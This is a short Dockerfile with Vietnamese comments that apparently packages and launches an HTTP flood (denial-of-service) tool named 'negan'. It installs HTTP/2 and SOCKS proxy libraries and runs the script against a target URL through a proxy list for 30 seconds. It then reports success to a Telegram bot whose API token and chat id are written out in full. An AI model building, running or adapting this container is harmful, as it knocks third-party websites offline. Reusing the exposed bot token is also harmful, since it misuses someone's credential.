# Sử dụng image Node.js từ Ubuntu
FROM node:lts as builder

# Copy tất cả các file vào thư mục /negan trong container
COPY . /negan

# Chuyển vào thư mục negan
WORKDIR /negan

# Cập nhật môi trường và cài đặt các dependencies
RUN npm install hpack https commander colors socks

# Chạy lệnh node với tham số truyền vào
RUN node /negan/negan -m GET -u https://muahack.com -p 1.txt --full true -s 30 && \
    curl -X POST https://api.telegram.org/bot7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw/sendMessage \
    -d "chat_id=7371969470&text=OK"


